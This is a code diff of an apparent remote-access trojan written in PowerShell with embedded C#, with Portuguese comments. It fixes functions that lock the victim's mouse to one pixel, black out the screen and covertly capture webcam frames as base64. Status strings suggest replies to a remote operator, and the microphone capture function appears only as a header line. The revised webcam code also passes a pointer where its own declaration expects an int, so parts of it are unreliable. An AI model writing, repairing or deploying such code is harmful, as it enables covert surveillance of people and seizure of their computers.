@@ -395,7 +395,7 @@ function Hide-BlackScreen {
     }
 }
 
-# ===== TRAVAR MOUSE =====
+# ===== TRAVAR MOUSE (CÓDIGO C# CORRIGIDO) =====
 $global:mouseLocked = $false
 $global:lockThread = $null
 
@@ -405,51 +405,59 @@ function Lock-Mouse {
         
         $global:mouseLocked = $true
         
+        # Primeiro, adiciona o tipo MouseLocker separadamente
+        $mouseLockerCode = @'
+using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+public class MouseLocker
+{
+    [DllImport("user32.dll")]
+    public static extern bool ClipCursor(ref RECT lpRect);
+    
+    [StructLayout(LayoutKind.Sequential)]
+    public struct RECT
+    {
+        public int left;
+        public int top;
+        public int right;
+        public int bottom;
+    }
+    
+    public static void Lock()
+    {
+        RECT rect = new RECT();
+        rect.left = 0;
+        rect.top = 0;
+        rect.right = 1;
+        rect.bottom = 1;
+        ClipCursor(ref rect);
+    }
+    
+    public static void Unlock()
+    {
+        RECT rect = new RECT();
+        rect.left = 0;
+        rect.top = 0;
+        rect.right = Screen.PrimaryScreen.Bounds.Width;
+        rect.bottom = Screen.PrimaryScreen.Bounds.Height;
+        ClipCursor(ref rect);
+    }
+}
+'@
+        
+        Add-Type -TypeDefinition $mouseLockerCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
+        
         $global:lockThread = [System.Threading.Thread]::new({
-            Add-Type -AssemblyName System.Windows.Forms
-            
-            while ($global:mouseLocked) {
-                try {
+            try {
+                while ($global:mouseLocked) {
                     [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                    
-                    Add-Type @"
-                        using System;
-                        using System.Runtime.InteropServices;
-                        public class MouseLocker {
-                            [DllImport("user32.dll")]
-                            public static extern bool ClipCursor(ref RECT lpRect);
-                            
-                            [StructLayout(LayoutKind.Sequential)]
-                            public struct RECT {
-                                public int left, top, right, bottom;
-                            }
-                            
-                            public static void Lock() {
-                                RECT rect = new RECT();
-                                rect.left = 0;
-                                rect.top = 0;
-                                rect.right = 1;
-                                rect.bottom = 1;
-                                ClipCursor(ref rect);
-                            }
-                            
-                            public static void Unlock() {
-                                RECT rect = new RECT();
-                                rect.left = 0;
-                                rect.top = 0;
-                                rect.right = Screen.PrimaryScreen.Bounds.Width;
-                                rect.bottom = Screen.PrimaryScreen.Bounds.Height;
-                                ClipCursor(ref rect);
-                            }
-                        }
-"@ -ReferencedAssemblies "System.Windows.Forms.dll"
-                    
                     [MouseLocker]::Lock()
-                    
-                    Start-Sleep -Milliseconds 10
-                } catch {
                     Start-Sleep -Milliseconds 10
                 }
+            } catch {
+                # Silently continue
             }
         })
         
@@ -466,34 +474,15 @@ function Unlock-Mouse {
     try {
         $global:mouseLocked = $false
         
-        Add-Type @"
-            using System;
-            using System.Runtime.InteropServices;
-            using System.Windows.Forms;
-            public class MouseLocker {
-                [DllImport("user32.dll")]
-                public static extern bool ClipCursor(ref RECT lpRect);
-                
-                [StructLayout(LayoutKind.Sequential)]
-                public struct RECT {
-                    public int left, top, right, bottom;
-                }
-                
-                public static void Unlock() {
-                    RECT rect = new RECT();
-                    rect.left = 0;
-                    rect.top = 0;
-                    rect.right = Screen.PrimaryScreen.Bounds.Width;
-                    rect.bottom = Screen.PrimaryScreen.Bounds.Height;
-                    ClipCursor(ref rect);
-                }
-            }
-"@ -ReferencedAssemblies "System.Windows.Forms.dll"
-        
-        [MouseLocker]::Unlock()
-        
         if ($global:lockThread -and $global:lockThread.IsAlive) {
             $global:lockThread.Abort()
+        }
+        
+        # Tenta chamar Unlock se o tipo existir
+        try {
+            [MouseLocker]::Unlock()
+        } catch {
+            # Ignora se não existir
         }
         
         return "MOUSE_UNLOCKED"
@@ -536,49 +525,54 @@ function Get-Microphone {
 # ===== WEBCAM =====
 function Get-Webcam {
     try {
-        Add-Type @"
-            using System;
-            using System.Drawing;
-            using System.Runtime.InteropServices;
-            using System.Windows.Forms;
+        $webcamCode = @'
+using System;
+using System.Drawing;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+public class WebcamCapture
+{
+    [DllImport("avicap32.dll")]
+    public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);
+    
+    [DllImport("user32.dll")]
+    public static extern int SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);
+    
+    [DllImport("user32.dll")]
+    public static extern bool DestroyWindow(IntPtr hWnd);
+    
+    const int WM_CAP_CONNECT = 0x400 + 10;
+    const int WM_CAP_DISCONNECT = 0x400 + 11;
+    const int WM_CAP_GET_FRAME = 0x400 + 12;
+    const int WM_CAP_SAVEDIB = 0x400 + 25;
+    
+    public static string Capture() {
+        IntPtr hWnd = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, IntPtr.Zero, 0);
+        if (hWnd != IntPtr.Zero) {
+            SendMessage(hWnd, WM_CAP_CONNECT, 0, 0);
+            SendMessage(hWnd, WM_CAP_GET_FRAME, 0, 0);
             
-            public class WebcamCapture {
-                [DllImport("avicap32.dll")]
-                public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);
-                
-                [DllImport("user32.dll")]
-                public static extern int SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);
-                
-                [DllImport("user32.dll")]
-                public static extern bool DestroyWindow(IntPtr hWnd);
-                
-                const int WM_CAP_CONNECT = 0x400 + 10;
-                const int WM_CAP_DISCONNECT = 0x400 + 11;
-                const int WM_CAP_GET_FRAME = 0x400 + 12;
-                const int WM_CAP_SAVEDIB = 0x400 + 25;
-                
-                public static string Capture() {
-                    IntPtr hWnd = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, IntPtr.Zero, 0);
-                    if (hWnd != IntPtr.Zero) {
-                        SendMessage(hWnd, WM_CAP_CONNECT, 0, 0);
-                        SendMessage(hWnd, WM_CAP_GET_FRAME, 0, 0);
-                        
-                        string filename = System.IO.Path.GetTempFileName() + ".bmp";
-                        SendMessage(hWnd, WM_CAP_SAVEDIB, 0, (int)Marshal.StringToHGlobalAnsi(filename));
-                        
-                        SendMessage(hWnd, WM_CAP_DISCONNECT, 0, 0);
-                        DestroyWindow(hWnd);
-                        
-                        if (System.IO.File.Exists(filename)) {
-                            byte[] bytes = System.IO.File.ReadAllBytes(filename);
-                            System.IO.File.Delete(filename);
-                            return Convert.ToBase64String(bytes);
-                        }
-                    }
-                    return null;
-                }
+            string filename = System.IO.Path.GetTempFileName() + ".bmp";
+            IntPtr pFilename = Marshal.StringToHGlobalAnsi(filename);
+            SendMessage(hWnd, WM_CAP_SAVEDIB, 0, pFilename);
+            Marshal.FreeHGlobal(pFilename);
+            
+            SendMessage(hWnd, WM_CAP_DISCONNECT, 0, 0);
+            DestroyWindow(hWnd);
+            
+            if (System.IO.File.Exists(filename)) {
+                byte[] bytes = System.IO.File.ReadAllBytes(filename);
+                System.IO.File.Delete(filename);
+                return Convert.ToBase64String(bytes);
             }
-"@ -ReferencedAssemblies "System.Drawing.dll", "System.Windows.Forms.dll"
+        }
+        return null;
+    }
+}
+'@
+        
+        Add-Type -TypeDefinition $webcamCode -ReferencedAssemblies "System.Drawing.dll", "System.Windows.Forms.dll" -ErrorAction Stop
         
         $frame = [WebcamCapture]::Capture()
         if ($frame) {
